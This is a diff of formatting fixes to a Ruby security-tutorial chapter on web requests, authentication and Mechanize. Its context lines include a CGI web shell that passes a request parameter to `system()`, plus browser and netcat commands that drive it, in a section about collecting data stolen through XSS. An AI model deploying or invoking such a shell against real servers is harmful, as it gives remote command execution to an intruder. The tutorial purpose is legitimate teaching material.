@@ -1,4 +1,4 @@
-# Module 0x4 \| Web Kung Fu
+# Module 0x4 | Web Kung Fu
 
 ## Send Get request
 
@@ -72,7 +72,7 @@ https://tinyurl.com/hg69vgm
 http://rubyfu.net
 ```
 
-Ok, what if I gave you this shortened url\(`http://short-url.link/f2a`\)? try the above script and tell me what's going-on
+Ok, what if I gave you this shortened url(`http://short-url.link/f2a`)? try the above script and tell me what's going-on
 
 ### Using Open-uri
 
@@ -134,9 +134,9 @@ puts response.body
 
 Let's to take the following form as a simple post form to mimic in our script
 
-| ![PostForm](../.gitbook/assets/webfu__post_form1.png) |
-| :---: |
-| **Figure 1.** Simple Post form |
+| ![PostForm](../images/module04/webfu\_\_post\_form1.png) |
+| :------------------------------------------------------: |
+|              **Figure 1.** Simple Post form              |
 
 Post form code:
 
@@ -245,7 +245,7 @@ Net::HTTP.start(uri1.host, uri1.port) do |http|
 end
 ```
 
-## HTTP authentication \(Basic, Digest, NTLM\)
+## HTTP authentication (Basic, Digest, NTLM)
 
 ### Basic authentication
 
@@ -266,11 +266,11 @@ puts res.body
 
 ### Digest authentication
 
-* Install net-http-digest\_auth gem
+*   Install net-http-digest\_auth gem
 
-  ```text
-  gem install net-http-digest_auth
-  ```
+    ```
+    gem install net-http-digest_auth
+    ```
 
 ```ruby
 require 'ntlm/http'
@@ -294,13 +294,13 @@ Here is an [example](https://gist.github.com/KINGSABRI/a1df06eb48cbc52660577df6c
 
 ### NTLM authentication
 
-* Install ntlm gem
+*   Install ntlm gem
 
-  ```text
-  gem install ruby-ntlm
-  ```
+    ```
+    gem install ruby-ntlm
+    ```
 
-  Note: ntlm gem works with http, imap, smtp protocols. [Read more](https://github.com/macks/ruby-ntlm).
+    Note: ntlm gem works with http, imap, smtp protocols. [Read more](https://github.com/macks/ruby-ntlm).
 
 ```ruby
 require 'ntlm/http'
@@ -325,14 +325,14 @@ When you exploit XSS or HTML injection you may need to receive the grepped data 
 
 Add the following to `/etc/apache2/sites-enabled/[SITE]` then restart the service
 
-```text
+```
 <Directory /var/www/[CGI FOLDER]>
         AddHandler cgi-script .rb
         Options +ExecCGI
 </Directory>
 ```
 
-Now, put the script in /var/www/\[CGI FOLDER\]. You can use it now.
+Now, put the script in /var/www/\[CGI FOLDER]. You can use it now.
 
 ```ruby
 #!/usr/bin/ruby
@@ -373,33 +373,33 @@ system(cgi['cmd'])
 
 Now you can simply use a web browser, Netcat or WebShellConsole to execute your commands. ex. **Browser**
 
-```text
+```
 http://host/cgi/shell.rb?cmd=ls -la
 ```
 
 **Netcat**
 
-```text
+```
 echo "GET /cgi/shell.rb?cmd=ls%20-la" | nc host 80
 ```
 
-**WebShellConsole \(**[**repository**](https://github.com/KINGSABRI/WebShellConsole)**\)**
+**WebShellConsole (**[**repository**](https://github.com/KINGSABRI/WebShellConsole)**)**
 
 run wsc
 
-```text
+```
 ruby wsc.rb
 ```
 
 Add Shell URL
 
-```text
+```
 Shell -> set http://host/cgi/shell.rb?cmd=
 ```
 
 Now prompt your commands
 
-```text
+```
 Shell -> ls -la
 ```
 
@@ -411,15 +411,15 @@ Since we're talking about dealing with web in ruby, we can't forget **Mechanize*
 
 More about Mechanize gem
 
-* [Getting Started With Mechanize](http://docs.seattlerb.org/mechanize/GUIDE_rdoc.html)
-* [Mechanize examples](http://docs.seattlerb.org/mechanize/EXAMPLES_rdoc.html)
-* [RailsCasts \| Mechanize tutorial](http://railscasts.com/episodes/191-mechanize)
+* [Getting Started With Mechanize](http://docs.seattlerb.org/mechanize/GUIDE\_rdoc.html)
+* [Mechanize examples](http://docs.seattlerb.org/mechanize/EXAMPLES\_rdoc.html)
+* [RailsCasts | Mechanize tutorial](http://railscasts.com/episodes/191-mechanize)
 
 Since you know the hard way, you'll find Mechanize as simple as mouse clicks! give it a try!
 
 ## HTTP.rb
 
-HTTP \(The Gem! a.k.a. http.rb\) is an easy-to-use client library for making requests from Ruby. It uses a simple method chaining system for building requests, similar to Python's Requests.
+HTTP (The Gem! a.k.a. http.rb) is an easy-to-use client library for making requests from Ruby. It uses a simple method chaining system for building requests, similar to Python's Requests.
 
 Under the hood, http.rb uses http\_parser.rb, a fast HTTP parsing native extension based on the Node.js parser and a Java port thereof. This library isn't just yet another wrapper around Net::HTTP. It implements the HTTP protocol natively and outsources the parsing to native extensions.
 
@@ -428,4 +428,3 @@ More about http.rb gem
 * [The Official repository](https://github.com/httprb/http)
 * [The official wiki](https://github.com/httprb/http/wiki)
 * [CGI Examples](http://www.java2s.com/Code/Ruby/CGI/CatalogCGI.htm)
-
